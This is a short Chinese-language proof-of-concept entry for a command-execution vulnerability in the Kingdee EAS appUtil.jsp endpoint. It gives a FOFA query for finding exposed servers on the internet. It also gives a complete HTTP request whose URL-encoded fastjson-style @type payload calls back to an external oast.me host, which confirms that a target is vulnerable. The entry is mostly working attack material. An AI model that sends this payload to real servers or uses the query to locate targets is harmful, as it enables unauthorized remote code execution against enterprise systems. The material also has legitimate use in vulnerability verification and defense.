# 金蝶EAS存在appUtil.jsp命令执行漏洞

金蝶EAS和金蝶EAS Cloud在多个版本中存在文件上传漏洞，未经授权的攻击者可以通过特制的请求包或上传恶意的webshell文件，从而进行远程代码执行，控制服务器。

## fofa

```javascript
app="Kingdee-EAS"
```

## poc

```javascript
GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22csbs1ru8ki46d67eiob0ywz51btedcjtj.oast.me%22%7D%7D HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411071131958.webp)



## 漏洞来源

- https://mp.weixin.qq.com/s/g7XvKIKPQf35z4IPt5i8iA
